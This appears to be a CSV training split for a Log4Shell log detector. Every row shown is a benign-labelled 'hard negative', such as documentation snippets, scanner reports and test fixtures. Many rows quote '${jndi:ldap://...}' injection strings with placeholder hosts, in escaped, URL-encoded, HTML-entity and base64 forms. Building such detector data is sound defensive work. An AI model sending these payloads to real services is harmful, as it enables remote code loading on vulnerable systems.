id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-003761,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0128,security_review indicator_sample='${jndi:ldap://docs.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0128,0,benign,benign_scanner_report,mixed,train,low
LS-003762,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-train-0129","info json_template={""example"":""\\${jndi:ldap://docs.example/json}"",""literal"":true} trace_id=hardneg-train-0129",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003763,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-train-0130,training note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-train-0130,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003764,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0131,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0131,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003765,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0132,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0132,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003766,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0133,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0133,0,benign,benign_encoded_search_query,mixed,train,low
LS-003767,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0134,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0134,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003768,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0135,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0135,0,benign,benign_documentation_example,mixed,train,low
LS-003769,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-train-0136,training note tokens '$' '{' 'jndi' ':ldap://' 'kb.internal' are shown separately for awareness trace_id=hardneg-train-0136,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003770,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-train-0137,training note tokens '$' '{' 'jndi' ':ldap://' 'defensive-lab.example' are shown separately for awareness trace_id=hardneg-train-0137,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003771,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0138","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0138",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003772,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0139","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0139",0,benign,benign_keyword_only,mixed,train,low
LS-003773,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-train-0140,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-train-0140,0,benign,escaped_payload,mixed,train,low
LS-003774,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-train-0141","info json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-train-0141",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003775,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0142,security_review indicator_sample='${jndi:ldap://defensive-lab.example/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0142,0,benign,benign_scanner_report,mixed,train,low
LS-003776,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0143,info escaped_code_sample value='\${jndi:ldap://training.local/escaped}' source=developer_guide trace_id=hardneg-train-0143,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003777,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdefensive-lab.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0144,get /docs/search?q=${jndi:ldap://defensive-lab.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0144,0,benign,benign_encoded_search_query,mixed,train,low
LS-003778,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0145,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0145,0,benign,benign_base64_artifact,mixed,train,low
LS-003779,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0146","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0146",0,benign,benign_keyword_only,mixed,train,low
LS-003780,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0147,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0147,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003781,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0148","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0148",0,benign,benign_keyword_only,mixed,train,low
LS-003782,2026-05-17,hard_negative,Blog article about Log4Shell payloads was requested trace_id=hardneg-train-0149,blog article about log4shell payloads was requested trace_id=hardneg-train-0149,0,benign,documentation,mixed,train,low
LS-003783,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0150,info markdown_code_block value='${jndi:ldap://kb.internal/sample}' render_context=documentation_only trace_id=hardneg-train-0150,0,benign,benign_documentation_example,mixed,train,low
LS-003784,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-train-0151,training note tokens '$' '{' 'jndi' ':ldap://' 'docs.example' are shown separately for awareness trace_id=hardneg-train-0151,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003785,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0152,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0152,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003786,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0153,assert literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0153,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003787,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0154,assert literal_payload_string equals '${jndi:ldap://playbook.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0154,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003788,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0155,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0155,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003789,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0156,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0156,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003790,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-train-0157,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-train-0157,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003791,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-train-0158","info json_template={""example"":""\\${jndi:ldap://defensive-lab.example/json}"",""literal"":true} trace_id=hardneg-train-0158",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003792,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fdocs.example%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0159,get /docs/search?q=${jndi:ldap://docs.example/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0159,0,benign,benign_encoded_search_query,mixed,train,low
LS-003793,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Ftraining.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0160,get /kb/log4shell?sample=${jndi:ldap://training.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0160,0,benign,benign_encoded_documentation,mixed,train,low
LS-003794,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0161,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0161,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003795,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9zYW1wbGUuaW52YWxpZC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0162,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9zyw1wbguuaw52ywxpzc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0162,0,benign,benign_base64_artifact,mixed,train,low
LS-003796,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0163,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0163,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003797,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0164,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0164,0,benign,benign_documentation_example,mixed,train,low
LS-003798,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0165,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0165,0,benign,benign_scanner_report,mixed,train,low
LS-003799,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-train-0166","info json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-train-0166",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003800,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0167,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0167,0,benign,benign_documentation_example,mixed,train,low
LS-003801,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Ftraining.local%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0168,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002ftraining.local%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0168,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003802,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;kb.internal&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0169,get /preview?html=${jndi:ldap://kb.internal/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0169,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003803,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0170,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0170,0,benign,benign_documentation_example,mixed,train,low
LS-003804,2026-05-17,hard_negative,"WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms trace_id=hardneg-train-0171","warn log4j notes mention jndi, ldap, rmi, and lookup syntax as separate documentation terms trace_id=hardneg-train-0171",0,benign,benign_keyword_only,mixed,train,low
LS-003805,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9wbGF5Ym9vay5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0172,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9wbgf5ym9vay5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0172,0,benign,benign_base64_artifact,mixed,train,low
LS-003806,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0173,security_review indicator_sample='${jndi:ldap://playbook.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0173,0,benign,benign_scanner_report,mixed,train,low
LS-003807,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-train-0174,info escaped_code_sample value='\${jndi:ldap://playbook.local/escaped}' source=developer_guide trace_id=hardneg-train-0174,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003808,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fkb.internal%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0175,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fkb.internal%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0175,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003809,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0176,assert literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0176,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003810,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0177,security_review indicator_sample='${jndi:ldap://sample.invalid/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0177,0,benign,benign_scanner_report,mixed,train,low
LS-003811,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0178,assert literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0178,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003812,2026-05-17,hard_negative,Developer opened Java Naming and Directory Interface documentation trace_id=hardneg-train-0179,developer opened java naming and directory interface documentation trace_id=hardneg-train-0179,0,benign,documentation,mixed,train,low
LS-003813,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0180,assert literal_payload_string equals '${jndi:ldap://training.local/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0180,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003814,2026-05-17,hard_negative,TRAINING note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-train-0181,training note tokens '$' '{' 'jndi' ':ldap://' 'training.local' are shown separately for awareness trace_id=hardneg-train-0181,0,benign,benign_fragmented_tutorial_text,mixed,train,low
LS-003815,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly90cmFpbmluZy5sb2NhbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0182,debug artifact payload_b64=jhtqbmrpomxkyxa6ly90cmfpbmluzy5sb2nhbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0182,0,benign,benign_base64_artifact,mixed,train,low
LS-003816,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fplaybook.local%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0183,get /kb/log4shell?sample=${jndi:ldap://playbook.local/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0183,0,benign,benign_encoded_documentation,mixed,train,low
LS-003817,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-train-0184","info json_template={""example"":""\\${jndi:ldap://training.local/json}"",""literal"":true} trace_id=hardneg-train-0184",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003818,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0185,assert literal_payload_string equals '${jndi:ldap://sample.invalid/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0185,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003819,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0186,security_review indicator_sample='${jndi:ldap://training.local/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0186,0,benign,benign_scanner_report,mixed,train,low
LS-003820,2026-05-17,hard_negative,SECURITY_REVIEW indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0187,security_review indicator_sample='${jndi:ldap://kb.internal/sample}' origin=threat_report status=not_seen_in_request trace_id=hardneg-train-0187,0,benign,benign_scanner_report,mixed,train,low
LS-003821,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0188","info json_template={""example"":""\\${jndi:ldap://sample.invalid/json}"",""literal"":true} trace_id=hardneg-train-0188",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003822,2026-05-17,hard_negative,INFO escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0189,info escaped_code_sample value='\${jndi:ldap://sample.invalid/escaped}' source=developer_guide trace_id=hardneg-train-0189,0,benign,benign_json_escaped_payload,mixed,train,low
LS-003823,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9kZWZlbnNpdmUtbGFiLmV4YW1wbGUvc2FtcGxlfQ== action=store_sample decode_at_runtime=false trace_id=hardneg-train-0190,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9kzwzlbnnpdmutbgfilmv4yw1wbguvc2ftcgxlfq== action=store_sample decode_at_runtime=false trace_id=hardneg-train-0190,0,benign,benign_base64_artifact,mixed,train,low
LS-003824,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Ftraining.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0191,get /docs/search?q=${jndi:ldap://training.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0191,0,benign,benign_encoded_search_query,mixed,train,low
LS-003825,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0192,info markdown_code_block value='${jndi:ldap://sample.invalid/sample}' render_context=documentation_only trace_id=hardneg-train-0192,0,benign,benign_documentation_example,mixed,train,low
LS-003826,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fkb.internal%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0193,get /docs/search?q=${jndi:ldap://kb.internal/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0193,0,benign,benign_encoded_search_query,mixed,train,low
LS-003827,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdefensive-lab.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0194,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdefensive-lab.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0194,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003828,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0195,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0195,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003829,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;docs.example&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0196,get /preview?html=${jndi:ldap://docs.example/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0196,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003830,2026-05-17,hard_negative,GET /wiki/log4j?sample=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fdocs.example%u002Fsample%u007D&view=copyable-text HTTP/1.1 Host: training.local trace_id=hardneg-train-0197,get /wiki/log4j?sample=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fdocs.example%u002fsample%u007d&view=copyable-text http/1.1 host: training.local trace_id=hardneg-train-0197,0,benign,benign_percent_u_documentation,mixed,train,low
LS-003831,2026-05-17,hard_negative,DEBUG artifact payload_b64=JHtqbmRpOmxkYXA6Ly9rYi5pbnRlcm5hbC9zYW1wbGV9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0198,debug artifact payload_b64=jhtqbmrpomxkyxa6ly9ryi5pbnrlcm5hbc9zyw1wbgv9 action=store_sample decode_at_runtime=false trace_id=hardneg-train-0198,0,benign,benign_base64_artifact,mixed,train,low
LS-003832,2026-05-17,hard_negative,GET /docs/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fplaybook.local%2Fsample%7D&purpose=defensive-note HTTP/1.1 Host: docs.local trace_id=hardneg-train-0199,get /docs/search?q=${jndi:ldap://playbook.local/sample}&purpose=defensive-note http/1.1 host: docs.local trace_id=hardneg-train-0199,0,benign,benign_encoded_search_query,mixed,train,low
LS-003833,2026-05-17,hard_negative,"INFO json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-train-0200","info json_template={""example"":""\\${jndi:ldap://playbook.local/json}"",""literal"":true} trace_id=hardneg-train-0200",0,benign,benign_json_escaped_payload,mixed,train,low
LS-003834,2026-05-17,hard_negative,GET /kb/log4shell?sample=%2524%257Bjndi%253Aldap%253A%252F%252Fsample.invalid%252Fsample%257D&display=literal HTTP/1.1 Host: kb.local trace_id=hardneg-train-0201,get /kb/log4shell?sample=${jndi:ldap://sample.invalid/sample}&display=literal http/1.1 host: kb.local trace_id=hardneg-train-0201,0,benign,benign_encoded_documentation,mixed,train,low
LS-003835,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;training.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0202,get /preview?html=${jndi:ldap://training.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0202,0,benign,benign_html_entity_documentation,mixed,train,low
LS-003836,2026-05-17,hard_negative,ASSERT literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0203,assert literal_payload_string equals '${jndi:ldap://defensive-lab.example/sample}' suite=parser_documentation mode=no_eval trace_id=hardneg-train-0203,0,benign,benign_unit_test_fixture,mixed,train,low
LS-003837,2026-05-17,hard_negative,Security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-train-0204,security scanner report mentions escaped example \${jndi:ldap://example.com/a} trace_id=hardneg-train-0204,0,benign,escaped_payload,mixed,train,low
LS-003838,2026-05-17,hard_negative,INFO markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0205,info markdown_code_block value='${jndi:ldap://playbook.local/sample}' render_context=documentation_only trace_id=hardneg-train-0205,0,benign,benign_documentation_example,mixed,train,low
LS-003839,2026-05-17,hard_negative,GET /preview?html=&#36;&#123;jndi&#58;ldap&#58;&#47;&#47;playbook.local&#47;sample&#125;&escaped=true HTTP/1.1 Host: cms.local trace_id=hardneg-train-0206,get /preview?html=${jndi:ldap://playbook.local/sample}&escaped=true http/1.1 host: cms.local trace_id=hardneg-train-0206,0,benign,benign_html_entity_documentation,mixed,train,low
